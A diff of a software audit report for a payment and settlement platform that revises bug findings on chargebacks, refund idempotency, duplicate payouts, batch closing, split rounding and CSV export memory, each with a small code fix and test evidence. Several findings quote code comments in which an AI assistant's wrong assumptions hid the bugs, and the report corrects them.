-<a id="f-ref-5"></a>
-
-### REF-5 · Status recompute turns chargebacks back into refundable captures · H7, H1, FP-300 · Severity: High
-**What's wrong:** The same finance backfill rewrites every `chargeback` transaction to `captured` / `partially_refunded` / `refunded`, erasing the chargeback and making the money refundable again.
-
-**Why it happens:** `recomputeTransactionStatusesForMerchant` (`apps/api/src/admin/transactionStatusRecompute.ts:29`) selects every row whose status is not `authorized` or `voided`, so chargebacks are included. It then sets each row to `nextStatusAfterRefund(...)` (`:38-44`), a function that only knows captured/partially_captured/partially_refunded/refunded and can never return `chargeback`. So the backfill "corrects" a chargeback into a capture.
-
-**What it breaks:** A 10,000-fil transaction that was charged back (the acquirer already pulled the 10,000 fils back) becomes `captured`, which is in `REFUNDABLE_STATUSES` (`refundValidation.ts:18`). Once FP-300 ships, the merchant can refund it, so the cardholder is paid twice (chargeback + refund = 20,000 fils out for one 10,000-fil sale). Reports and the timeline also lose the chargeback.
-
-**Why it needed a fix:** It is a direct double-payout path once refunds go live, and the backfill is presented to finance as safe to rerun.
-
-**Fix:** `apps/api/src/admin/transactionStatusRecompute.ts:29`
-```diff
--      WHERE merchant_id = $1 AND status NOT IN ('authorized', 'voided')
-+      WHERE merchant_id = $1 AND status NOT IN ('authorized', 'voided', 'chargeback')
-```
-Lines: prod +1/−1, test +23/−0.
-
-**Why this is the smallest correct fix:** a chargeback is a terminal state that amounts cannot recompute, so it must not be a candidate at all. One literal in the WHERE clause does that. Why not teach `nextStatusAfterRefund` about chargebacks? It is the shared refund state machine (FP-300 uses it), and widening its contract is a larger, riskier change.
-
-**Proof:** `adminMerchantsRecompute.audit.test.ts` "recompute-statuses leaves chargeback transactions as chargeback" fails before (`expected: 'chargeback', actual: 'captured'`) and passes after; the file plus `routes/admin.test.ts`: 43/43.
-
-**Regression risk:** chargeback rows are no longer counted in `scanned`; nothing else reads that count for chargebacks.
-
-**Trap note:** `docs/ADMIN.md:41-43` "Safe to run more than once" and the YA "idempotent" note (`apps/admin/src/api/merchants.ts:58`): it is idempotent only because it destroys the chargeback state on the first run.
-
----
-
 <a id="f-bal-1"></a>
 
 ### BAL-1 · Admin "rebuild cached balances" rebuilds from scheme export lines, not the ledger · F4, FP-203 · Severity: High
@@ -954,66 +903,6 @@ Commit: `3df94da`. Lines: prod +2/-2 (1 code line, 1 comment line), test +39/-0.
 
 ---
 
-<a id="f-cw-5"></a>
-
-### CW-5 · Acquirer callbacks are never deduplicated · FP-201 · Severity: High
-
-**What's wrong:** `applyAcquirerCallback` does an unconditional `INSERT INTO acquirer_callback_notes`; nothing checks `callback_id` and the table has no unique constraint, so every acquirer redelivery adds another identical fraud-review note.
-
-**Why it happens:** `apps/api/src/acquirer/callbacks.ts:37-50` has no `ON CONFLICT`; `db/migrations/0051_acquirer_callback_notes.sql:8-12,18` leaves `callback_id` unconstrained; `withCallbackRetry` (`callbacks.ts:62-78`) re-runs the insert on any error. The `processed_events` table that HANDOVER.md:63-64, the CHANGELOG (1.6.0, 1.9.0) and 0051:29-31 (MK "FP-238 adds a unique index here as well — done") rely on exists in no migration or code path; postmortem action #9 claims a replay test that `callbacks.test.ts` never had.
-
-**What it breaks:** Acquirer B retries a callback up to 5 times with the same callbackId when our 2xx is late. A single "confirmed_fraud" verdict can appear 2-6 times on one payment's timeline (FP-201); with CW-7's missing freshness check (now fixed) a captured callback could be replayed indefinitely. Worked example from the test: 2 sequential + 3 concurrent deliveries of one callback → 5 rows.
-
-**Why it needed a fix:** FP-201 duplicates confuse support/finance, and any future state-changing callback built on this pattern would be applied twice (the 2026-05-14 incident class).
-
-**Fix:** new `db/migrations/0086_acquirer_callback_notes_dedupe.sql` (deletes existing duplicates keeping the earliest `(created_at, id)`, then `CREATE UNIQUE INDEX uq_acquirer_callback_notes_txn_callback ON acquirer_callback_notes (transaction_id, callback_id)`), and `apps/api/src/acquirer/callbacks.ts:40-41`:
-```diff
--     VALUES ($1, $2, $3, $4, $5, $6, $7)`,
-+     VALUES ($1, $2, $3, $4, $5, $6, $7)
-+     ON CONFLICT (transaction_id, callback_id) DO NOTHING`, // CW-5: acquirer redeliveries (FP-201)
-```
-Commit: `b43c940`. Lines: prod +12/-1 (TS +2/-1, SQL +10), test +14/-0.
-
-**Why this is the smallest correct fix:** The database is the only place that is race-free (the concurrent half of the test proves a SELECT-then-INSERT check would not be). Per-transaction key matches the FP-201 symptom and stays safe if the acquirer reuses ids across transactions. The route still returns 200 on a redelivery so the acquirer stops retrying. Why not a `processed_events` table: new table + code path for the same guarantee. Why not drop `withCallbackRetry`: the insert is now idempotent, so the retry is harmless.
-
-**Proof:** `acquirer/callbacks.test.ts` "applyAcquirerCallback records a redelivered callback once (sequential and concurrent)": before `expected 1, actual 5`; after passes. `routes/acquirerCallbacks.test.ts` still green (11/11 across both files).
-
-**Regression risk:** The migration's DELETE removes historical duplicate notes (identical redeliveries; earliest kept). Unique index build takes a brief lock on a small table (CONCURRENTLY is not possible inside `db/migrate.ts`'s transaction). Covered by both callback test files.
-
-**Trap note:** The false "deduplicated" claims (CHANGELOG, HANDOVER.md:63, 0051:29-31 MK, postmortem #1/#9) are not editable here (docs/applied migration outside this lane); this note and the migration header record the correction.
-
----
-
-<a id="f-close-1"></a>
-
-### CLOSE-1 · run-batch closes and pays a business day that has not ended · H5 · Severity: High
-**What's wrong:** `CloseBatch` (and so `RunDailyBatch`, the `run-batch` CLI, `POST /internal/run-batch` and the daemon) accepted today's or a future date. It closed and paid the batch with the volume captured so far, and every later capture of that day was stranded.
-
-**Why it happens:** `apps/settlement/internal/settlement/batch.go:60-62`: CloseBatch computed `[start, end)` from `BusinessDayWindow` but never compared `end` with the current time. A batch that is closed or paid is skipped on the next run (`ON CONFLICT ... DO NOTHING` plus status checks), so captures after the early close never get a `settlement_batch_id`. ADMIN.md:73-75 ("re-running is always safe"), RUNBOOK:44-45 and ARCHITECTURE:51-52 told operators it was safe.
-
-**What it breaks:** admin re-run of 2026-09-01 at 08:26 Bahrain (seen in the audit log): every merchant's 09-01 batch is paid on 00:00-08:26 volume only. For Alpha Retail (~3,932 BD/day) about 2,550 BD (2,550,000 fils) stays on merchant_payable, never batched or paid, and nothing reports it.
-
-**Why it needed a fix:** a single early click (or an early daemon tick, see SCHED-1) permanently strands a day's later captures, and merchants are underpaid with no alert.
-
-**Fix:** `batch.go:62-64`
-```diff
- 	start, end := BusinessDayWindow(businessDate)
-+	if time.Now().Before(end) { // CLOSE-1 (H5): never close a Bahrain business day that has not ended
-+		return BatchResult{}, fmt.Errorf("settlement: CloseBatch: business day %s has not ended (Asia/Bahrain)", businessDate.Format("2006-01-02"))
-+	}
-```
-Commit: `56cdd1f`. Lines: prod +3/-0, test +25/-0.
-
-**Why this is the smallest correct fix:** CloseBatch is the single function every entry point funnels through, and it already has the Bahrain window end in hand. The check happens before any write, so nothing is created for an unfinished day. Why not guard only RunDailyBatch (dossier option): direct CloseBatch callers would stay open. Why not validate in server.go/main.go: there are three entry points to patch instead of one. The HTTP layer returns its existing 500 `run_batch_failed`; mapping it to 409 is a nice-to-have in the TS/admin layer.
-
-**Proof:** `TestRunDailyBatch_RefusesUnfinishedBusinessDay` (close_window_audit_test.go) failed before: `RunDailyBatch for today's (unfinished) Bahrain business day succeeded, want an error` and `1 batch(es) closed/paid for an unfinished business day, want 0`. It passes after. The settlement, internalapi and scheduler packages are green; every existing test closes past dates.
-
-**Regression risk:** any caller passing the current Bahrain date now gets an error. The daemon passes the previous Bahrain day once SCHED-1 is fixed; before SCHED-1, its UTC-based "yesterday" is always a day that has ended in Bahrain too, because UTC lags Bahrain. Repair for past early closes: settle captures with `settlement_batch_id IS NULL` whose day's batch is closed or paid, via an adjustment batch (ops-approved).
-
-**Trap note:** ADMIN.md, RUNBOOK and ARCHITECTURE "re-runs are always safe" are docs outside apps/settlement and are not edited here; the coordinator should correct them (see report).
-
----
-
 <a id="f-hold-1"></a>
 
 ### HOLD-1 · Nightly hold janitor deletes every hold on a night with nothing expired · (no case ref; data integrity) · Severity: High
@@ -1046,6 +935,7 @@ plus 3 comment/log lines that described deletion (`:29` doc comment, `:42` the F
 <a id="f-ref-6"></a>
 
 ### REF-6 · Acquirer refund idempotency key changes on every retry · FP-300 (☐2 "money is right in the ledger") · Severity: High
+**Category:** Bug
 
 **What's wrong:** The refund sent to the acquirer is keyed `${claimId}:${attemptCount}`. When a same-key retry follows a 502, the acquirer sees a brand-new request and pays it again, even if the first call went through and only the response was lost.
 
@@ -1060,7 +950,7 @@ plus 3 comment/log lines that described deletion (`:29` doc comment, `:42` the F
 -    idempotencyKey: `${prepared.claimId}:${prepared.attemptCount}`,
 +    idempotencyKey: prepared.claimId, // REF-6: stable across retries so the acquirer replays, never pays twice
 ```
-Commit: `9b6da21`. Lines: prod +1/-1, test +24/-0.
+Commit: `9b6da21`. Lines: prod +1/-1, test +24/-0. Follow-up REF-6b (`de6d70a`, below): prod +1/-1, test +22/-0. Row total: prod +2/-2, test +46/-0.
 
 **Why this is the smallest correct fix:** It is a single expression change. The claim id is already unique per (merchant, endpoint, client key) and stays the same across retries, so it is the natural stable key. The "money leaves before a durable record" half of this lead is already closed by REF-1: phase 1 now commits a reservation of `refunded_fils` before the acquirer call, so a crash in phase 3 fails closed and the reserved fils cannot be refunded again under a new key.
 - Why not derive the key from the client's `Idempotency-Key`: the claim id already wraps it, scoped per merchant.
@@ -1069,50 +959,11 @@ Commit: `9b6da21`. Lines: prod +1/-1, test +24/-0.
 
 **Proof:** The new test `REF-6: a same-key retry after an acquirer error reuses the acquirer idempotency key` uses a recording acquirer that returns `error` and then `approved`. Before the fix it failed with `expected: '<claim>:1'`, `actual: '<claim>:2'`. After the fix both calls carry the same key, the first answers 502 and the retry 200. processRefund + initiateMerchantRefund: 23 pass, 0 fail.
 
-**Regression risk:** `acquirer/simulator.ts:156-168` caches every refund result by key, including a rolled `error`. With a stable key, a same-key retry against the built-in simulator replays the cached `error` (502 again) instead of rolling again. That is fail-safe (no double payout), but with `ACQUIRER_FAILURE_RATE > 0` the client then has to use a new key. A real acquirer does not cache a transport error. The out-of-lane patch below makes the simulator behave the same way. The existing test "an acquirer transport error answers 502 and leaves the key retryable" uses a fixed stub and still passes. Residual: a 502 releases the REF-1 reservation, so a *different*-key refund sent inside that window is not blocked. That is an unknown-outcome reconciliation case and is out of scope. Out-of-lane patch for the simulator owner: `simulator.ts:167` `refundCache.set(...)` → `if (result.outcome !== "error") refundCache.set(req.idempotencyKey, result);`.
+**Regression risk:** `acquirer/simulator.ts:156-168` caches every refund result by key, including a rolled `error`. With a stable key, a same-key retry against the built-in simulator replays the cached `error` (502 again) instead of rolling again. That is fail-safe (no double payout), but with `ACQUIRER_FAILURE_RATE > 0` the client then has to use a new key. A real acquirer does not cache a transport error; the follow-up below makes the simulator behave the same way. The existing test "an acquirer transport error answers 502 and leaves the key retryable" uses a fixed stub and still passes. Residual: a 502 releases the REF-1 reservation, so a *different*-key refund sent inside that window is not blocked. That is an unknown-outcome reconciliation case and is out of scope.
 
 **Trap note:** `processRefund.ts:39` ("validate, call the acquirer, then journal") and `processRefund.test.ts:392` ("a retry with the same key re-attempts") present the re-attempt as safe. They stay, because the re-attempt is now safe at the acquirer.
 
----
-
-<a id="f-cw-1"></a>
-
-### CW-1 · A payout disbursement record is written per webhook delivery, not per batch · INC-2026-08-21 · Severity: High
-
-**What's wrong:** The `settlement.paid` pre-delivery effect inserts a `settlement_payout_disbursements` row (a payout-rail instruction) for every delivery row whose `attempt_count` is 0, and the table has no uniqueness on `settlement_batch_id`, so one paid batch gets one instruction per endpoint, per replay, per racing dispatcher and per duplicate outbox row.
-
-**Why it happens:** `apps/api/src/webhooks/dispatcher.ts:37-42` wires the effect; `dispatcher.ts:160-163` runs it when `attempt_count === 0`, a stale read taken by an unlocked SELECT (`:221-228`, MK "no SKIP LOCKED") and only incremented after the HTTP send; `apps/api/src/webhooks/payoutDisbursement.ts:15-16` inserts with a fresh `'disb_'||gen_random_uuid()` and no `ON CONFLICT`; `db/migrations/0057_settlement_payout_disbursements.sql:17-18` has only a non-unique index. Hidden by 0057:20 "Written inside PayoutBatch's transaction, one row per paid batch" (false: the api dispatcher writes it), `index.ts:29` ("SKIP LOCKED in the claim query", none exists), and `payoutDisbursement.test.ts:40` (FH: "only checks the insert, not who calls it or how often").
-
-**What it breaks:** Batch net payout 471,300 fils (471.300 BD), merchant with two active endpoints: two disbursement rows totalling 942,600 fils, i.e. 471.300 BD of phantom payout instructions, matching INC-2026-08-21 / ADMIN.md:107 ("two disbursement records each"). The ledger has one payout leg pair, so disbursements and ledger drift by (N-1) × net.
-
-**Why it needed a fix:** Anything that instructs the bank from this table double-pays merchants.
-
-**Fix:** new `db/migrations/0087_settlement_payout_disbursements_unique_batch.sql` (removes existing duplicates keeping the earliest `(created_at, id)`; `CREATE UNIQUE INDEX uq_settlement_payout_disbursements_batch ON settlement_payout_disbursements (settlement_batch_id)`), and `apps/api/src/webhooks/payoutDisbursement.ts:16-17`:
-```diff
--     VALUES ($1, $2, 'disb_' || gen_random_uuid())`,
-+     VALUES ($1, $2, 'disb_' || gen_random_uuid())
-+     ON CONFLICT (settlement_batch_id) DO NOTHING`, // CW-1: once per batch, not per webhook delivery
-```
-Commit: `14db87c` (CW-1), `ec100ed` (CW-1b). Lines: prod +12/-1 (TS +2/-1, SQL +10), test +34/-0.
-
-**Why this is the smallest correct fix:** The invariant is "one instruction per batch", so it belongs on the batch key in the database, which closes every fan-out path at once (multiple endpoints, replays, two replicas, restart mid-pass, duplicate `settlement.paid` outbox rows from Go). Why not only a compare-and-swap lease on the delivery row (dossier step 3): it stops racing dispatchers but not the per-endpoint/per-replay fan-out. Why not move the effect into Go `PayoutBatch`: correct long term, but a cross-lane redesign (>30 lines). The duplicate webhook *sends* from two racing dispatchers are a separate dispatcher-concurrency issue (not changed here).
-
-**Proof:** `dispatcher.test.ts` "settlement.paid to a merchant with two endpoints records one disbursement": before `{ n: '2', … }` vs expected `{ n: '1', total: '471300' }`; after passes. `payoutDisbursement.test.ts` "recordPayoutDisbursementEffect is idempotent per batch": before `expected 1, actual 3`; after passes.
-
-**Regression risk:** The migration deletes historical duplicate disbursement rows; finance should review them before production apply (the dossier's caveat). No other code reads/writes the table (grep). Covered by `payoutDisbursement.test.ts`, `dispatcher.test.ts`, `archiveReplay.test.ts` (16/16).
-
-**Trap note:** 0057:20 is an applied migration and is not edited; the 0087 header states the real writer. Not owned here: `index.ts:29,35-36` claims (SKIP LOCKED, stop() waits), `docs/ARCHITECTURE.md:50-51`, ADMIN.md:108 root cause; the Go producer half (`payout_notify.go` NOT EXISTS + INSERT, no unique outbox index) is lane D's NOTIFY-1. A merchant with no endpoint still gets no disbursement record (the effect only runs on delivery); moving it to `PayoutBatch` is recommended to lane D.
-
-**Follow-up (advisor review, commit "fix(CW-1b)"): never delete financial records.** The first version of 0087 deleted
-duplicate historic disbursement rows to make a full unique index possible. That destroys evidence finance needs for
-INC-2026-08-21. 0087 (never applied outside our test databases) now creates a **partial** unique index
-`ON (settlement_batch_id) WHERE created_at >= '2026-10-30 00:00:00+03'` and deletes nothing; the insert's
-`ON CONFLICT` names the same predicate. New batches get exactly one record; historic duplicates stay for review.
-Finance cleanup item: `SELECT settlement_batch_id, count(*), sum(amount_fils) FROM settlement_payout_disbursements
-GROUP BY 1 HAVING count(*) > 1;`. Residual: a replay for a batch paid before the fix date can still add one new record
-(it is not covered by the partial index); replays of old batches are an admin action. Test:
-`payoutDisbursement.test.ts` "historic duplicate disbursement rows are kept; only new rows are unique per batch":
-before `duplicate key value violates unique constraint`, after 3 rows kept. Lines: SQL +3/−5, TS +1/−1, test +17/−0.
+**Follow-up REF-6b (ours, merged into this row):** this appeared only after the REF-6 fix and only in the built-in acquirer simulator. The simulator's refund idempotency cache stored every outcome, including `error` (`apps/api/src/acquirer/simulator.ts:167`). Once REF-6 made the key stable, a refund that rolled a transport `error` replayed that cached `error` (502) on every same-key retry and could never complete. The simulator fails 2% of calls by default (`ACQUIRER_FAILURE_RATE`, `config.ts:224`) and 30% of those are `error` (`simulator.ts:103-111`). No money moved: the 502 releases the REF-1 reservation, but the merchant's same-key retry was stuck. An `error` is an unknown outcome and must not be pinned; `approved` and `declined` are final and stay cached. Fix (`de6d70a`, `simulator.ts:167`): `if (result.outcome !== "error") refundCache.set(req.idempotencyKey, result);`. Undoing REF-6 instead would reopen the double payout. Proof: `simulator.audit.test.ts` "a refund that errored is really retried under the same idempotency key" failed before (`expected: 'approved', actual: 'error'`) and passes after. The capture and authorize caches use the same pattern but are not retried with a stable key today, so they are left as they are. Lines: prod +1/-1, test +22/-0.
 
 ---
 
@@ -1339,52 +1190,6 @@ Commit: `08b0e59`. Lines: prod +2/-1, test +36/-0.
 
 ---
 
-<a id="f-split-1"></a>
-
-### SPLIT-1 · Split children are rounded separately, so the remainder is lost (or invented) · F3, H2 · Severity: High
-**What's wrong:** `PayoutSplitBatch` gave each sub-merchant `ApplyRateFils(net, weightBps)` independently (banker's rounding per child). The children's shares do not sum to the batch's net payout: fils are left behind on the parent or paid twice.
-
-**Why it happens:** `apps/settlement/internal/splits/allocate.go:97` (`share := money.ApplyRateFils(money.Fils(netPayout), weightBps)`). Each child rounds on its own, and nothing hands out the difference. The TS side already has the correct largest-remainder `allocateRemainder` (packages/money/src/fils.ts:161), but the Go port never used it. `shares.go`'s `ChildShares` repeats the same per-child rounding, and its only test (`TestChildShares_SumToNet`) uses round amounts (10000 at 5000/5000, etc.) that never leave a remainder. Migration 0045 notes that the 10000-bps total is "enforced by whatever creates these rows", i.e. nothing.
-
-**What it breaks:** net 100 fils at 3333/3333/3334 bps pays 33+33+33 = 99 fils: 1 fil per batch stays on the parent's merchant_payable and never reaches any child. Net 1,001 fils at the same weights rounds to 334+334+334 = 1,002 fils, 1 fil more than the batch owes. Weights that do not total 10000 silently pay the wrong share of the batch.
-
-**Why it needed a fix:** split payouts must pay exactly the batch's net (F3/H2). Every batch with a remainder either strands money with the parent or overpays children, and the ledger drifts by that amount.
-
-**Fix:** `allocate.go:97` + `:106-121` (+ `fmt`, `sort` imports)
-```diff
--		share := money.ApplyRateFils(money.Fils(netPayout), weightBps)
-+		share := money.Fils(netPayout * weightBps / 10_000) // floor; remainder handed out below (SPLIT-1)
- ...
-+	// SPLIT-1 (F3, H2): largest-remainder split as packages/money allocateRemainder,
-+	// so the children receive exactly netPayout; the weights must total 10000 bps.
-+	leftover, sumBps := money.Fils(netPayout), int64(0)
-+	order := make([]int, len(shares))
-+	for i, s := range shares {
-+		leftover, sumBps, order[i] = leftover-s.AllocatedFils, sumBps+s.WeightBps, i
-+	}
-+	if sumBps != 10_000 {
-+		return SplitPayoutResult{}, fmt.Errorf("splits: PayoutSplitBatch: child weights total %d bps, want 10000", sumBps)
-+	}
-+	sort.SliceStable(order, func(a, b int) bool {
-+		return netPayout*shares[order[a]].WeightBps%10_000 > netPayout*shares[order[b]].WeightBps%10_000
-+	})
-+	for k := 0; leftover > 0; k++ {
-+		shares[order[k]].AllocatedFils++
-+		leftover--
-+	}
-```
-Commit: `2b6d181`. Lines: prod +21/-1, test +66/-0.
-
-**Why this is the smallest correct fix:** it is the same algorithm as the TS `allocateRemainder` (floor each share, then give +1 fil to the largest remainders, ties by ascending index), applied in place where the shares are built and before any ledger leg is written. There is no new helper or signature change, and the posting loop is untouched. Because the weight denominator is fixed at 10000 bps, the TS decimal-scaling step is not needed. The 10000-bps check refuses a misconfigured parent instead of paying a wrong share (the transaction rolls back and nothing is paid). Why not round-to-nearest plus "dump the remainder on the last child": it is not TS-parity and is biased toward one child. Why not fix `ChildShares` in shares.go: it is not on the payout path (no production caller), so fixing it would not fix the payout. It is left as is and flagged.
-
-**Proof:** `TestPayoutSplitBatch_SharesSumToNet` (splits/allocate_audit_test.go) failed before: `child at 3334 bps got 33 fils, want 34` and `children got 99 fils in total, want the full net payout 100`. It passes after. The splits, settlement and internalapi packages are green.
-
-**Regression risk:** shares change by at most +1 fil per child, and only when a remainder exists. `totalAllocated` now equals `netPayout`, so `ApplyPayout` debits the full net (which resolves the "am: should pass netPayout here" drift note). A parent whose weights do not total 10000 bps now fails loudly instead of underpaying.
-
-**Trap note:** `TestChildShares_SumToNet` used only remainder-free amounts, so the per-child rounding was never exercised. That test and `ChildShares` are left untouched (unused in production).
-
----
-
 <a id="f-auth-3"></a>
 
 ### AUTH-3 · Admin API-key rotation never revokes the old key · H4 · Severity: High
@@ -1420,6 +1225,10 @@ Commit: `cfcd6f6`. Lines: prod +2/-0, test +6/-7 (corrected assertions in `route
 <a id="f-notify-1"></a>
 
 ### NOTIFY-1 · settlement.paid enqueue is check-then-insert with no unique key, so concurrent runs double-notify · INC-2026-08-21 · Severity: High
+**Category:** Bug
+
+**Case attribution:** this is the case file's INC-2026-08-21 ("Shops got two 'your payout is on the way' messages for the same payout. Two processes checked at the same time, and both thought they were first."): a check-then-insert by two processes. CW-1 (duplicate rows in the write-only disbursement table) no longer claims this incident.
+
 **What's wrong:** `EnqueuePayoutNotifications` selects paid batches `WHERE NOT EXISTS (settlement.paid outbox row)` and then INSERTs, with no lock and no unique key. Two enqueuers (the daemon tick and a `run-batch` CLI run) both pass the check and both insert, so the merchant receives `settlement.paid` twice.
 
 **Why it happens:** `apps/settlement/internal/settlement/payout_notify.go:29-95`. Under READ COMMITTED, neither transaction sees the other's uncommitted row. The comment at `:27` quoted "claude: No, outbox_events has a unique index on (event_type, aggregate_id)", but migration 0009 only has `idx_outbox_unprocessed` (non-unique). MK's "daemon and CLI never overlap" (`:28`) is contradicted by INC-2026-08-21.
@@ -1511,14 +1320,15 @@ Commit: `cf8075a`. Lines: prod +1/-1, test +45/-0.
 <a id="f-idem-1"></a>
 
 ### IDEM-1 · Capture idempotency hash omits the transaction id, so a reused key on another transaction replays a fake success · FP-300 (☐2 "money is right in the ledger") · Severity: High
+**Category:** Bug
 
 **What's wrong:** A capture idempotency key is scoped to (merchant, endpoint, key), and its request hash covers only `amountFils`. Reusing a key on a *different* transaction with the same body is therefore treated as a replay: the second transaction gets the first one's 200 body and is never captured.
 
-**Why it happens:** `apps/api/src/payments/capture.ts:92` hashed `{ amountFils }` only. `claimIdempotencyKey` (`idempotency.ts:118-153`) finds the completed row for the same (merchant, `transactions.capture`, key), sees an equal hash, and returns `replay`. The transaction id is in the URL path, not the body, so it never reached the hash. The faulty assumption was that keys are per transaction. A test comment hid this (`routes/transactions.test.ts:218-219`): "FH: should also cover same key + same body on a DIFFERENT transaction -> 422 (API.md). Claude says that case can't happen because keys are per transaction".
+**Why it happens:** `apps/api/src/payments/capture.ts:92` hashed `{ amountFils }` only. `claimIdempotencyKey` (`idempotency.ts:118-153`) finds the completed row for the same (merchant, `transactions.capture`, key), sees an equal hash, and returns `replay`. The transaction id is in the URL path, not the body, so it never reached the hash. The faulty assumption was that keys are per transaction. A test comment hid this (`routes/transactions.test.ts:218-219`): "FH: should also cover same key + same body on a DIFFERENT transaction -> 422 ... Claude says that case can't happen because keys are per transaction". (That comment cites an `API.md`; no such file exists in the repo, so we do not rely on it.)
 
 **What it breaks:** A client derives its key from the order (`capture-order-1042`) and the order is re-authorized. Txn A (5,000 fils) is captured. Txn B (8,000 fils) then gets 200 with A's body but stays `authorized`, with 0 fils captured. Goods ship, the hold lapses, and 8,000 fils is never collected. The replay also re-triggers the route's discount adjustment path for B.
 
-**Why it needed a fix:** The API answers "captured" for money it never captured. That is silent revenue loss, and it breaks the 422 `idempotency_key_reused` contract that migration 0019 and API.md promise.
+**Why it needed a fix:** The API answers "captured" for money it never captured. That is silent revenue loss. It also breaks the contract written next to the idempotency table: the FH comment at `db/migrations/0019_idempotency_keys.sql:32-33` says "for capture, request_hash covers the transaction id as well as the body, so reusing a key on a different transaction is a 422". That comment describes the intended behaviour as if it were done, and the code never did it. `capture.ts:104` already maps a hash mismatch to 422 `idempotency_key_reused`; the transaction id just never reached the hash.
 
 **Fix:** `apps/api/src/payments/capture.ts:92`
 ```diff
@@ -1541,17 +1351,20 @@ Commit: `696a028`. Lines: prod +1/-1, test +16/-2.
 
 <a id="f-exp-1"></a>
 
-### EXP-1 · CSV export buffers a merchant's whole history in memory in a 512 MB container · H9 · Severity: High
+### EXP-1 · CSV export buffers a merchant's whole history in memory in a 512 MB container (mitigated: 400 above 50,000 rows; streaming deferred) · H9 · Severity: High
+**Category:** Bug
+
+**Status: mitigation, not a full fix.** The export still builds the whole file in memory. What changed is that it now refuses (400 `export_too_large`) any request above 50,000 rows instead of buffering it, which bounds the memory one request can take. Real streaming is deferred (see "Why this is the smallest correct fix").
 
 **What's wrong:** `GET /v1/transactions/export` calls `buildTransactionsExportCsv`, which runs an unbounded `SELECT *` (from/to optional, so no params = full history), keeps every row, maps them to a second array, joins one string and sends it.
 
 **Why it happens:** `apps/api/src/transactions/exportCsv.ts:31-49`: `pool.query` resolves only after the driver buffered every row; `result.rows`, the lines array, the joined string and Fastify's Buffer copy are alive at once. The 3-month limit exists only in the dashboard date picker. The only paging code, `streamTransactionsExportCsv` (`:52-85`), has no caller, and its `occurred_at > $5` cursor (JS Date, ms vs µs, no tiebreak) duplicates rows and can loop forever.
 
-**What it breaks:** FP-209 measured ~20 MB per 18,432 rows (~1.1 KB/row) over 171 MB idle RSS. A no-date export of ~310k transactions (~340 MB), or four concurrent full-history exports for Delta Wholesale (~92k rows each), exceed 512 MB; the kernel kills the API (authorize/capture, payment links, dispatcher for every merchant) and compose has no restart policy.
+**What it breaks:** the repo's own load-test note (`docs/perf/fp-209-loadtest-2026-09.md:44,52`, a repo document, not the case file's FP-209) reports about 20 MB per 18,432-row export (~1.1 KB/row) over 171 MB idle RSS on the 512 MB container. A no-date export of ~310k transactions (~340 MB), or four concurrent full-history exports for Delta Wholesale (~92k rows each), exceed 512 MB; the kernel kills the API (authorize/capture, payment links, dispatcher for every merchant), and the shipped `ops/docker-compose.yml` has no restart policy.
 
 **Why it needed a fix:** any merchant session or API key can take the whole platform down with one request.
 
-**Fix (bounded, not streaming):** `apps/api/src/transactions/exportCsv.ts`: `EXPORT_MAX_ROWS = 50_000`; the query gets `LIMIT $5` = 50,001 and more than 50,000 rows throws `BadRequestError("export_too_large", "narrow the date range")` (400). Worst case per request ≈ 55 MB; even five concurrent ≈ 275 MB + 171 MB idle < 512 MB. Commit: `c05f50d`. Lines: prod +8/-2, test +13/-0.
+**Fix (a mitigation: bounded, not streaming):** `apps/api/src/transactions/exportCsv.ts:7,48-51`: `EXPORT_MAX_ROWS = 50_000`; the query gets `LIMIT $5` = 50,001 and more than 50,000 rows throws `BadRequestError("export_too_large", "narrow the date range")` (400). Worst case per request ≈ 55 MB; even five concurrent ≈ 275 MB + 171 MB idle < 512 MB. Commit: `c05f50d`. Lines: prod +8/-2, test +13/-0.
 
 **Why this is the smallest correct fix:** it hard-bounds memory at the single query that buffers, inside the lane's file, without touching the route contract for normal exports. Rejected/deferred: real streaming (the dossier's `exportCsvChunks` generator with an `(occurred_at, id)` keyset and `Readable.from` in `routes/transactions.ts:161-171`) is the proper fix, about 20-25 lines across `exportCsv.ts` and `routes/transactions.ts` (not owned by this lane), and must replace the broken `streamTransactionsExportCsv` cursor. Why not a date-range cap: rows per range vary by merchant, so it does not bound memory. Why not silently truncate at N rows: produces a wrong file.
 
@@ -1597,63 +1410,26 @@ F = Σ credits − Σ debits on `platform_fee_revenue` for the transaction, excl
 
 ---
 
-<a id="f-ref-1b"></a>
-
-### REF-1b · A refund racing a declined refund can lock the transaction as `refunded` for good · FP-209 / H1 · Severity: High
-
-**What's wrong:** After REF-1, a refund reserves its amount in `transactions.refunded_fils` in phase 1 and only releases it if the acquirer declines. Phase 3 of an approved refund computed the new status from `refunded_fils`, which also contains other refunds' in-flight reservations. If that other refund is then declined, its reservation is released but the status written from it is not.
-
-**Why it happens:** `apps/api/src/payments/processRefund.ts:170-176` (before the fix) set `newRefundedTotal = refunded_fils` (comment: "already includes this refund") and passed it to `nextStatusAfterRefund`. The decline branch (`:156-158`) only subtracts the reservation; it never recomputes the status. `validateRefundRequest` (`payments/refundValidation.ts:31`) refuses any status outside the refundable set, so a `refunded` row is final.
-
-**What it breaks:** Capture 10,000. Refund B (6,000) reserves (refunded_fils 6,000) and waits at the acquirer. Refund A (4,000) passes validation (refundable 4,000), reserves (10,000), is approved and writes status `refunded`, a `refunded` timeline event and a `refund.succeeded` webhook saying `refundedTotalFils: 10000, newStatus: refunded`. B is declined: refunded_fils goes back to 4,000. The transaction now says `refunded` with 6,000 fils captured and never refunded; every later refund of those 6,000 is 409 `transaction_not_refundable`. The merchant's customer cannot be refunded, and the webhook and timeline told the merchant it was fully refunded.
-
-**Why it needed a fix:** FP-300 box 1 (refunds work end to end) and H1 (state and money must agree). The race is the normal shape of two partial refunds from two clients, which the public route now allows.
-
-**Fix:** `apps/api/src/payments/processRefund.ts:170-182`
-```diff
--    const cur = await client.query<{ refunded_fils: string }>(`SELECT refunded_fils FROM transactions WHERE id = $1 FOR UPDATE`, [prepared.transactionId]);
--    const newRefundedTotal = toFils(Number(cur.rows[0]!.refunded_fils)); // already includes this refund (reserved in phase 1)
-+    await client.query(`SELECT refunded_fils FROM transactions WHERE id = $1 FOR UPDATE`, [prepared.transactionId]);
-+    // REF-8: ... (moved up 5 lines, unchanged)
-+    const prior = await client.query<...>(`SELECT COALESCE(SUM(amount_fils), 0) ... FROM refunds WHERE transaction_id = $1 AND status = 'succeeded'`, ...);
-+    const newRefundedTotal = toFils(Number(prior.rows[0]!.amount) + prepared.requestedAmount); // REF-1b: succeeded refunds + this one; refunded_fils also holds other refunds' in-flight reservations
-     const newStatus = nextStatusAfterRefund({ ... refundedTotalFils: newRefundedTotal });
